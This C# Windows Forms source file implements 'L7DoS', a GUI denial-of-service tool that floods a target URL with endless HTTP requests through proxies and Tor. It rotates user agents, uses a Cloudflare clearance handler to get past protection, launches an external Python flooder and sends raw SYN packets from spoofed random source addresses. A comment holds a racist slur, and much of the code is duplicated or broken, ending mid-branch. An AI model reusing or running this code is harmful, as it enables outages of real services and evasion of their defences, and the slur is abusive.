using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Http;
using System.Net.WebSockets;
using CloudFlareUtilities;
using static System.Windows.Forms.Design.AxImporter;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Diagnostics;
using PacketDotNet;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Button;
using System.Net.NetworkInformation;
using SharpPcap;
using System.Linq.Expressions;
using System.Runtime.InteropServices;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Runtime.InteropServices;
using Starksoft.Aspen.Proxy;
using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using System.Net.Sockets;
using M15A3_MCWS.Properties;
using System.IO.Compression;
using System.Threading;
using System.Threading.Tasks;
using System.Text;
using Noemax.Compression;
using System.Reflection;
using System.Runtime.Intrinsics.Arm;
using Noemax.Lzma;
using System.Management;
using Starksoft.Aspen.Proxy;
using System.Security.Cryptography;

namespace M15A3_MCWS
{
    public partial class L7DoS : Form
    {
        //ɹƎפפIN - kamarad Dmitrije Ivanova, nigersky princ socialniho inzenyrstvi
        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        int i = 0;
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        private void pictureBox3_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
(
int nLeftRect,     // x-coordinate of upper-left corner
int nTopRect,      // y-coordinate of upper-left corner
int nRightRect,    // x-coordinate of lower-right corner
int nBottomRect,   // y-coordinate of lower-right corner
int nWidthEllipse, // width of ellipse
int nHeightEllipse // height of ellipse
);
        public L7DoS()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        int x;
        string name;
        string id;
        string desc;
        PhysicalAddress admac;
        CaptureDeviceList cdl = CaptureDeviceList.Instance;
        ILiveDevice dev;
        string ip;
        string port;
        private void GET_CheckedChanged(object sender, EventArgs e)
        {

        }
        public string fupc(bool boo)
        {
            if (string.IsNullOrEmpty(boo.ToString()))
            {
                return "";
            }
            string b = boo.ToString();
            return b[0].ToString().ToUpper() + b.Substring(1);
        }
        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            if (textBox2.Text.Contains(":"))
            {
                string ip = textBox2.Text.Split(':')[0];
                string port = textBox2.Text.Split(":")[1];
            }
        }
        private void L7DoS_Load(object sender, EventArgs e)
        {
            try
            {
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                    foreach (NetworkInterface n in nics)
                    {
                        if (n.OperationalStatus == OperationalStatus.Up)
                        {
                            admac = n.GetPhysicalAddress();
                            name = n.Name;
                            id = n.Id;
                            desc = n.Description;
                            break;
                        }
                        x++;
                    }
                    dev = cdl[x];
                if (cdl.Count > 0)
                {
                    foreach (ILiveDevice d in cdl)
                    {
                        comboBox3.Items.Insert(i, i + ") " + d.Name + d.Description + " | MAC Address: " + d.MacAddress);
                        i++;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public static PhysicalAddress randmac()
        {
            var random = new Random();
            var buffer = new byte[6];
            random.NextBytes(buffer);
            var result = String.Concat(buffer.Select(x => string.Format("{0}:", x.ToString("X2"))).ToArray());
            return PhysicalAddress.Parse(result.TrimEnd(':'));
        }
        public static IPAddress randipv6()
        {
            byte[] b = new byte[16];
            Random random = new Random();
            random.NextBytes(b);
            IPAddress ipv6 = new IPAddress(b);
            return ipv6;

        }
        public IPAddress randip()
        {
            Random r = new Random();
            string ips = $"{r.Next(0, 255)}.{r.Next(0, 255)}.{r.Next(0, 255)}.{r.Next(0, 255)}";
            IPAddress ipa = IPAddress.Parse(ips);
            return ipa;
        }
        private async void button1_Click(object sender, EventArgs e)
        {
            try {
                if (checkBox3.Checked)
                {
                    Random r = new Random();
                    string[] uas = System.IO.File.ReadAllLines(@"useragents.txt");
                    switch (comboBox1.SelectedIndex)
                    {
                        case 0:
                            if (checkBox1.Checked)
                            {
                                while (true)
                                {
                                    WebRequest wr = (HttpWebRequest)WebRequest.Create(textBox1.Text);
                                    wr.Proxy = new WebProxy(textBox2.Text);
                                }
                            }
                            else
                            {
                                while (true)
                                {
                                    WebRequest wr = (HttpWebRequest)WebRequest.Create(textBox1.Text);
                                }
                            }
                            break;
                        case 1:
                            if (checkBox1.Checked)
                            {
                                var ch = new ClearanceHandler();
                                HttpClient hc = new HttpClient(ch);
                                HttpClientHandler hch = new HttpClientHandler();
                                hch.UseProxy = true;
                                hch.Proxy = new WebProxy(textBox2.Text);
                                while (GET.Checked)
                                {
                                    hc.GetAsync(textBox1.Text);
                                }
                                while (POST.Checked)
                                {
                                    hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                }
                                while (DELETE.Checked)
                                {
                                    hc.DeleteAsync(textBox1.Text);
                                }
                                while (PUT.Checked)
                                {
                                    hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                }
                            }
                            else
                            {
                                var ch = new ClearanceHandler();
                                HttpClient hc = new HttpClient(ch);
                                HttpClientHandler hch = new HttpClientHandler();
                                hch.UseProxy = true;
                                hch.Proxy = new WebProxy();
                                while (GET.Checked)
                                {
                                    hc.GetAsync(textBox1.Text);
                                }
                                while (POST.Checked)
                                {
                                    hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                }
                                while (DELETE.Checked)
                                {
                                    hc.DeleteAsync(textBox1.Text);
                                }
                                while (PUT.Checked)
                                {
                                    hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                }
                            }
                            break;
                        case 2:
                            Process proc = new Process();
                            ProcessStartInfo psi = proc.StartInfo;
                            psi.FileName = @"M15_L7.py";
                            psi.Arguments = $"--url {textBox1.Text} --method 2 --get {fupc(GET.Checked)} --proxy {textBox2.Text} --up {fupc(checkBox1.Checked)} --post {fupc(POST.Checked)} --put {fupc(PUT.Checked)} --head {fupc(HEAD.Checked)} --delete {fupc(DELETE.Checked)} --options {fupc(OPTIONS.Checked)}";
                            break;
                        case 3:
                            Process proc2 = new Process();
                            ProcessStartInfo psi2 = proc2.StartInfo;
                            psi2.FileName = @"M15_L7.py";
                            psi2.Arguments = $"--url {textBox1.Text} --method 3 --get {fupc(GET.Checked)} --proxy {textBox2.Text} --up {fupc(checkBox1.Checked)} --post {fupc(POST.Checked)} --put {fupc(PUT.Checked)} --head {fupc(HEAD.Checked)} --delete {fupc(DELETE.Checked)} --options {fupc(OPTIONS.Checked)}";
                            break;
                        case 4:
                            if (checkBox1.Checked)
                            {
                                HttpClientHandler hch = new HttpClientHandler();
                                HttpClient hc = new HttpClient(hch);
                                hch.Proxy = new WebProxy(textBox2.Text);
                                while (GET.Checked)
                                {

                                    int index = r.Next(0, uas.Length);
                                    hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                    hc.GetAsync(textBox1.Text);
                                }
                                while (POST.Checked)
                                {

                                    int index = r.Next(0, uas.Length);
                                    hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                    hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                }
                                while (DELETE.Checked)
                                {

                                    int index = r.Next(0, uas.Length);
                                    hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                    hc.DeleteAsync(textBox1.Text);
                                }
                                while (PUT.Checked)
                                {

                                    int index = r.Next(0, uas.Length);
                                    hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                    hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                }
                            }
                            else
                            {
                                HttpClientHandler hch = new HttpClientHandler();
                                HttpClient hc = new HttpClient(hch);
                                hch.Proxy = new WebProxy(textBox2.Text);
                                for (int x = 0; x < trackBar1.Value; x++)
                                {
                                    while (GET.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.GetAsync(textBox1.Text);
                                    }
                                    while (POST.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                    while (DELETE.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.DeleteAsync(textBox1.Text);
                                    }
                                    while (PUT.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                }
                            }
                            break;
                        case 5:
                            HttpClientHandler hch1 = new HttpClientHandler();
                            hch1.UseProxy = true;
                            hch1.Proxy = new WebProxy("socks5://127.0.0.1:9050");
                            HttpContent hco = new ByteArrayContent(Encoding.UTF8.GetBytes(@"E\x00\x00\xc8\x00\x01\x00\x00@\x06\xbf\xae\x01\t\x07\x05\xac\xff\x05t\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00Pv\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00"));
                            HttpClient hc1 = new HttpClient(hch1);
                            HttpRequestMessage hrm = new HttpRequestMessage();
                            hc1.BaseAddress = new Uri(textBox1.Text);
                            hrm.Content = hco;
                            int i = r.Next(0, uas.Length);
                            hc1.DefaultRequestHeaders.UserAgent.ParseAdd(uas[i]);
                            hrm.RequestUri = new Uri(textBox1.Text);
                            while (true)
                            {
                                await hc1.GetAsync(textBox1.Text);
                                hc1.DefaultRequestHeaders.UserAgent.ParseAdd(uas[i]);
                            }
                            break;
                        case 6:
                            IPAddress ipa = IPAddress.Parse(textBox1.Text);
                            ushort sport = ushort.Parse(textBox2.Text);
                            ushort dport = 80;
                            IPAddress sp = Dns.GetHostAddresses(textBox1.Text)[0];
                            IPEndPoint ipe = new IPEndPoint(ipa, dport);
                            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                            IPv4Packet ip = new IPv4Packet(sp, ipa);
                            IPv6Packet ip6 = new IPv6Packet(sp, ipa);
                            var tcp = new TcpPacket(sport, dport);
                            ushort ttl = 250;
                            ip.PayloadPacket = tcp;
                            tcp.SourcePort = sport;
                            tcp.DestinationPort = dport;
                            var hc3 = new HttpClient();

                            var req = new HttpRequestMessage(HttpMethod.Get, textBox1.Text)
                            {
                                Version = new Version(2, 0)
                            };
                            if (GET.Checked)
                            {
                                req.Method = HttpMethod.Get;
                            }
                            if (POST.Checked)
                            {
                                req.Method = HttpMethod.Post;
                            }
                            if (DELETE.Checked)
                            {
                                req.Method = HttpMethod.Delete;
                            }
                            if (PUT.Checked)
                            {
                                req.Method = HttpMethod.Put;
                            }
                            if (TRACE.Checked)
                            {
                                req.Method = HttpMethod.Trace;
                            }
                            if (PATCH.Checked)
                            {
                                req.Method = HttpMethod.Patch;
                            }
                            if (OPTIONS.Checked)
                            {
                                req.Method = HttpMethod.Options;
                            }
                            tcp.Reset = true;
                            while (true)
                            {
                                await hc3.SendAsync(req);
                                dev.SendPacket(ep.Bytes);
                            }
                            break;
                        case 7:
                            dev.Open();
                            IPAddress a = randip();
                            EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                            IPv4Packet ip1 = new IPv4Packet(a, IPAddress.Parse(textBox3.Text));
                            TcpPacket t = new TcpPacket(80, 80);
                            t.Synchronize = true;
                            IPv4Packet ip2 = new IPv4Packet(IPAddress.Parse(textBox3.Text), a);
                            TcpPacket t1 = new TcpPacket(80, 80);
                            TcpPacket hr = new TcpPacket(80, 80);
                            string method = "";
                            if (GET.Checked)
                            {
                                method = "GET";
                            }
                            if (POST.Checked)
                            {
                                method = "POST";
                            }
                            if (DELETE.Checked)
                            {
                                method = "DELETE";
                            }
                            if (PUT.Checked)
                            {
                                method = "PUT";
                            }
                            if (TRACE.Checked)
                            {
                                method = "TRACE";
                            }
                            if (PATCH.Checked)
                            {
                                method = "PATCH";
                            }
                            if (CONNECT.Checked)
                            {
                                method = "CONNECT";
                            }
                            if (OPTIONS.Checked)
                            {
                                method = "OPTIONS";
                            }
                            hr.PayloadData = Encoding.UTF8.GetBytes($@"{method} / HTTP/2\r\nHost: {textBox2.Text}\r\nUserAgent: {uas[new Random().Next(0, uas.Length)]}\r\n\r\n");
                            t1.Synchronize = true;
                            t1.Acknowledgment = true;
                            hr.Acknowledgment = true;
                            for (int x = 0; x < trackBar1.Value; x++)
                            {
                                while (true)
                                {
                                    hr.PayloadData = Encoding.UTF8.GetBytes($@"{method} / HTTP/2\r\nHost: {textBox2.Text}\r\nUserAgent: {uas[new Random().Next(0, uas.Length)]}\r\n\r\n");
                                    ip1.PayloadPacket = t;
                                    ep1.PayloadPacket = ip1;
                                    dev.SendPacket(ep1);
                                    ip2.PayloadPacket = t1;
                                    ep1.PayloadPacket = ip2;
                                    dev.SendPacket(ep1);
                                    ip1.PayloadPacket = hr;
                                    ep1.PayloadPacket = ip1;
                                    dev.SendPacket(ep1);
                                    a = randip();
                                }
                            }
                            break;
                        case 8:
                            dev.Open();
                            IPAddress aa = randip();
                            EthernetPacket ep1a = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                            IPv4Packet ip1a = new IPv4Packet(aa, IPAddress.Parse(textBox3.Text));
                            TcpPacket ta = new TcpPacket(80, 80);
                            ta.Synchronize = true;
                            IPv4Packet ip2a = new IPv4Packet(IPAddress.Parse(textBox3.Text), aa);
                            TcpPacket t1a = new TcpPacket(80, 80);
                            TcpPacket hra = new TcpPacket(80, 80);
                            string methoda = "";
                            if (GET.Checked)
                            {
                                methoda = "GET";
                            }
                            if (POST.Checked)
                            {
                                methoda = "POST";
                            }
                            if (DELETE.Checked)
                            {
                                methoda = "DELETE";
                            }
                            if (PUT.Checked)
                            {
                                methoda = "PUT";
                            }
                            if (TRACE.Checked)
                            {
                                methoda = "TRACE";
                            }
                            if (PATCH.Checked)
                            {
                                methoda = "PATCH";
                            }
                            if (CONNECT.Checked)
                            {
                                methoda = "CONNECT";
                            }
                            if (OPTIONS.Checked)
                            {
                                methoda = "OPTIONS";
                            }
                            hra.PayloadData = Encoding.UTF8.GetBytes($@"{methoda} / HTTP/2\r\nHost: {textBox2.Text}\r\n\r\n");
                            t1a.Synchronize = true;
                            t1a.Acknowledgment = true;
                            hra.Acknowledgment = true;
                            for (int x = 0; x < trackBar1.Value; x++)
                            {
                                while (true)
                                {
                                    hra.PayloadData = Encoding.UTF8.GetBytes($@"{methoda} / HTTP/2\r\nHost: {textBox2.Text}\r\nUserAgent: {uas[new Random().Next(0, uas.Length)]}\r\n\r\n");
                                    ip1a.PayloadPacket = ta;
                                    ep1a.PayloadPacket = ip1a;
                                    dev.SendPacket(ep1a);
                                    ip2a.PayloadPacket = t1a;
                                    ep1a.PayloadPacket = ip2a;
                                    dev.SendPacket(ep1a);
                                    ip1a.PayloadPacket = hra;
                                    ep1a.PayloadPacket = ip1a;
                                    dev.SendPacket(ep1a);
                                    a = randip();
                                }
                            }
                            break;
                    }
                }
                else
                {
                    if (checkBox3.Checked)
                    {
                        Random r = new Random();
                        string[] uas = System.IO.File.ReadAllLines(@"useragents.txt");
                        switch (comboBox1.SelectedIndex)
                        {
                            case 0:
                                if (checkBox1.Checked)
                                {
                                    while (true)
                                    {
                                        WebRequest wr = (HttpWebRequest)WebRequest.Create(textBox1.Text);
                                        wr.Proxy = new WebProxy(textBox2.Text);
                                    }
                                }
                                else
                                {
                                    while (true)
                                    {
                                        WebRequest wr = (HttpWebRequest)WebRequest.Create(textBox1.Text);
                                    }
                                }
                                break;
                            case 1:
                                if (checkBox1.Checked)
                                {
                                    var ch = new ClearanceHandler();
                                    HttpClient hc = new HttpClient(ch);
                                    HttpClientHandler hch = new HttpClientHandler();
                                    hch.UseProxy = true;
                                    hch.Proxy = new WebProxy(textBox2.Text);
                                    while (GET.Checked)
                                    {
                                        hc.GetAsync(textBox1.Text);
                                    }
                                    while (POST.Checked)
                                    {
                                        hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                    while (DELETE.Checked)
                                    {
                                        hc.DeleteAsync(textBox1.Text);
                                    }
                                    while (PUT.Checked)
                                    {
                                        hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                }
                                else
